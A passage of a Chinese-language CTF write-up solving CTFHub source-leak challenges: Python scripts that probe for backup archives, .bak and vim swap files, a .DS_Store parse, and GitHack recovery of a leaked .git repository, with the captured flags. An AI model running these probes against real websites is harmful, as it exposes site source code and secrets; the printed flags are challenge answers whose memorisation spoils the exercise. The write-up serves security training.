punctuation">(</span>name<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] 看起来解压的过程中出现了一点问题'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    folder <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\\"</span> <span class="token operator">+</span> <span class="token string">'unzip_folder'</span>    dir_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>folder<span class="token punctuation">)</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> dir_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> line <span class="token operator">!=</span> <span class="token string">"index.html"</span><span class="token punctuation">:</span>            header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> line<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>            <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"^ctfhub{.*}"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>                <span class="token keyword">if</span> len<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 最终flag为："</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">process_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name_list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'rar'</span><span class="token punctuation">,</span> <span class="token string">'tar.gz'</span><span class="token punctuation">,</span> <span class="token string">'tar'</span><span class="token punctuation">,</span> <span class="token string">'zip'</span><span class="token punctuation">]</span>    name_list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'web'</span><span class="token punctuation">,</span> <span class="token string">'website'</span><span class="token punctuation">,</span> <span class="token string">'backup'</span><span class="token punctuation">,</span> <span class="token string">'back'</span><span class="token punctuation">,</span> <span class="token string">'www'</span><span class="token punctuation">,</span> <span class="token string">'wwwroot'</span><span class="token punctuation">,</span> <span class="token string">'temp'</span><span class="token punctuation">]</span>    name_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> name1 <span class="token keyword">in</span> name_list1<span class="token punctuation">:</span>        <span class="token keyword">for</span> name2 <span class="token keyword">in</span> name_list2<span class="token punctuation">:</span>            name_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>name2 <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> name1<span class="token punctuation">)</span>    <span class="token keyword">return</span> name_list<span class="token keyword">def</span> <span class="token function">get_zipfile</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> open<span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 写入 %s完成！"</span> <span class="token operator">%</span> name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    names <span class="token operator">=</span> process_name<span class="token punctuation">(</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> <span class="token string">"http://challenge-52e23664acf37dae.sandbox.ctfhub.com:10080/"</span>    <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">:</span>        header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> name<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>                content <span class="token operator">=</span> res<span class="token punctuation">.</span>content                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 检测到了%s,正在下载..."</span> <span class="token operator">%</span> name<span class="token punctuation">)</span>                get_zipfile<span class="token punctuation">(</span>name<span class="token punctuation">,</span> content<span class="token punctuation">)</span>                unzip_file<span class="token punctuation">(</span>name<span class="token punctuation">)</span>                get_flag<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到的结果是</p><pre class="line-numbers language-bash"><code class="language-bash">检测到了www.zip 正在下载<span class="token punctuation">..</span>.下载完成解压完成获取到的flag为：ctfhub<span class="token punctuation">{</span>a0f7e3a2630c76950dbceb4bad4f088cfd2efcb7<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2、bak文件"><a href="#3-2、bak文件" class="headerlink" title="3.2、bak文件"></a>3.2、bak文件</h4><p>​        当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/4/5 16:59</span><span class="token keyword">from</span> requests <span class="token keyword">import</span> RequestException<span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">get_user_agent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>    <span class="token punctuation">]</span>    <span class="token keyword">return</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://challenge-dc76a806659c9dd9.sandbox.ctfhub.com:10080/"</span>    bak <span class="token operator">=</span> <span class="token string">'index.php.bak'</span>    header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span> <span class="token punctuation">:</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> bak<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">".*(ctfhub{.*})"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到的结果是</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>2235cea3ec81eb9569f4604251fe8a7120b95049<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-3、vim缓存"><a href="#3-3、vim缓存" class="headerlink" title="3.3、vim缓存"></a>3.3、vim缓存</h4><p>​        当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p><p>通常 <code>vim</code> 的备份文件有：</p><ol><li><strong><code>.filename.swp</code></strong></li><li><strong><code>filename~</code></strong></li><li><strong><code>.filename.un.~</code></strong></li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">as</span> ur<span class="token punctuation">,</span> urllib<span class="token punctuation">.</span>parse<span class="token keyword">import</span> zipfile<span class="token punctuation">,</span> os<span class="token keyword">import</span> rerr <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\bctfhub{.*}'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>res <span class="token operator">=</span> ur<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://challenge-5aa8b1e1be6c5d78.sandbox.ctfhub.com:10080/.index.php.swp'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>rr<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>str<span class="token punctuation">(</span>res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到的结果是</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>67e244df614a707bf252d60711afef3767e41492<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-4、-DS-Store"><a href="#3-4、-DS-Store" class="headerlink" title="3.4、.DS_Store"></a>3.4、.DS_Store</h4><p>​        <code>.DS_Store</code> 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><p>这里通过下面的地址直接获取到文件</p><pre class="line-numbers language-bash"><code class="language-bash">http://challenge-3092fd23a1d60f94.sandbox.ctfhub.com:10080/.DS_Store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后通过Linux命令获取文件内容</p><pre class="line-numbers language-bash"><code class="language-bash">xxd -p DS_Store <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/00//g'</span> <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">'\n'</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/\([0-9A-F]\{2\}\)/0x\1 /g'</span> <span class="token operator">|</span> xxd -r -p <span class="token operator">|</span> strings <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/ptb[LN]ustr//g'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到的结果如下</p><pre class="line-numbers language-bash"><code class="language-bash">Bud1DSDB<span class="token variable">$e536ae211065e6cb535b1a8080a2baa3</span>.txtnoteustrflag here<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接着构建脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">as</span> urres <span class="token operator">=</span> ur<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://challenge-3092fd23a1d60f94.sandbox.ctfhub.com:10080/e536ae211065e6cb535b1a8080a2baa3.txt'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到的结果是</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>b00feb505c3f4e6df73d8612c76bd5deb5aa4475<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4、Git泄露"><a href="#4、Git泄露" class="headerlink" title="4、Git泄露"></a>4、Git泄露</h3><h4 id="4-1、Log"><a href="#4-1、Log" class="headerlink" title="4.1、Log"></a>4.1、Log</h4><p>​        当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master python GitHack.py http://challenge-426b1b2da4ddd315.sandbox.ctfhub.com:10080/.git/  ____ _ _   _   _            _ / ___<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>  _<span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>  _  <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span> \____<span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__,_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>\_\<span class="token punctuation">{</span>0.0.5<span class="token punctuation">}</span> A <span class="token string">'.git'</span> folder disclosure exploit.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Check Depends<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Check depends end<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Set Paths<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Target Url: http://challenge-426b1b2da4ddd315.sandbox.ctfhub.com:10080/.git/<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Target<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone straightly<span class="token punctuation">[</span>*<span class="token punctuation">]</span> CloneCloning into <span class="token string">'/mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080'</span><span class="token punctuation">..</span>.fatal: repository <span class="token string">'http://challenge-426b1b2da4ddd315.sandbox.ctfhub.com:10080/.git/'</span> not found<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Clone Error<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone with Directory Listing<span class="token punctuation">[</span>*<span class="token punctuation">]</span> http://challenge-426b1b2da4ddd315.sandbox.ctfhub.com:10080/.git/ is not support Directory Listing<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token punctuation">[</span>Skip<span class="token punctuation">]</span><span class="token punctuation">[</span>First Try<span class="token punctuation">]</span> Target is not support Directory Listing<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to clone with Cache<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Git<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cache files<span class="token punctuation">[</span>*<span class="token punctuation">]</span> packed-refs<span class="token punctuation">[</span>*<span class="token punctuation">]</span> config<span class="token punctuation">[</span>*<span class="token punctuation">]</span> HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> COMMIT_EDITMSG<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ORIG_HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> FETCH_HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/heads/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/remote/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> index<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/heads/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/b5/aa9e47f5f2a2b02e23da913c5137976e36a716<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/90/f6b210fccb96c831fb0149bd777d02f2fdc5b9<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/9d/aceca66ad6be96b31ab966d60ca6e6beb02ebb<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/2c/59e3024e3bc350976778204928a21d9ff42d01<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/ba/69d13b39c28abea7f0f7865d83d8cb6aa83b10<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/ac/48499ac2bda260e59471019e8506a71980f5a2<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects End<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/remote/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/stash<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/stash<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Valid Repository<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Valid Repository Success<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Clone Success. Dist File <span class="token keyword">:</span> /mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后进入到响应的文件夹查看git log</p><pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master <span class="token function">cd</span> dist/challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080➜  challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">git</span> log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>运行得到的结果如下</p><pre class="line-numbers language-bash"><code class="language-bash">commit b5aa9e47f5f2a2b02e23da913c5137976e36a716 <span class="token punctuation">(</span>HEAD -<span class="token operator">></span> master<span class="token punctuation">)</span>Author: CTFHub <span class="token operator">&lt;</span>sandbox@ctfhub.com<span class="token operator">></span>Date:   Sun Mar 15 12:54:22 2020 +0000    remove flagcommit 90f6b210fccb96c831fb0149bd777d02f2fdc5b9Author: CTFHub <span class="token operator">&lt;</span>sandbox@ctfhub.com<span class="token operator">></span>Date:   Sun Mar 15 12:54:22 2020 +0000    add flagcommit ba69d13b39c28abea7f0f7865d83d8cb6aa83b10Author: CTFHub <span class="token operator">&lt;</span>sandbox@ctfhub.com<span class="token operator">></span>Date:   Sun Mar 15 12:54:22 2020 +0000    init<span class="token punctuation">(</span>END<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当前所处的版本为 <code>remove flag</code>，flag 在 <code>add flag</code>，我们就要切换版本</p><pre class="line-numbers language-bash"><code class="language-bash">➜  challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">git</span> reset --hard 90f6HEAD is now at 90f6b21 add flag➜  challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ lltotal 0-rwxrwxrwx 1 kali kali  49 Mar 15 21:05 298682056511664.txt-rwxrwxrwx 1 kali kali 494 Mar 15 21:05 50x.html-rwxrwxrwx 1 kali kali 143 Mar 15 21:05 index.html➜  challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">cat</span> 298682056511664.txtctfhub<span class="token punctuation">{</span>f0aa23ed987f7f88905579799a5f7da12f6cc491<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-2、Stash"><a href="#4-2、Stash" class="headerlink" title="4.2、Stash"></a>4.2、Stash</h4><pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master python GitHack.py http://challenge-bcc954ebd1926525.sandbox.ctfhub.com:10080/.git/  ____ _ _   _   _            _ / ___<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>  _<span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>  _  <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span> \____<span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__,_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>\_\<span class="token punctuation">{</span>0.0.5<span class="token punctuation">}</span> A <span class="token string">'.git'</span> folder disclosure exploit.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Check Depends<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Check depends end<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Set Paths<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Target Url: http://challenge-bcc954ebd1926525.sandbox.ctfhub.com:10080/.git/<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Target<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone straightly<span class="token punctuation">[</span>*<span class="token punctuation">]</span> CloneCloning into <span class="token string">'/mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080'</span><span class="token punctuation">..</span>.fatal: repository <span class="token string">'http://challenge-bcc954ebd1926525.sandbox.ctfhub.com:10080/.git/'</span> not found<span class="token punctuation">[</span>-<span class="token punctuation">]</span> 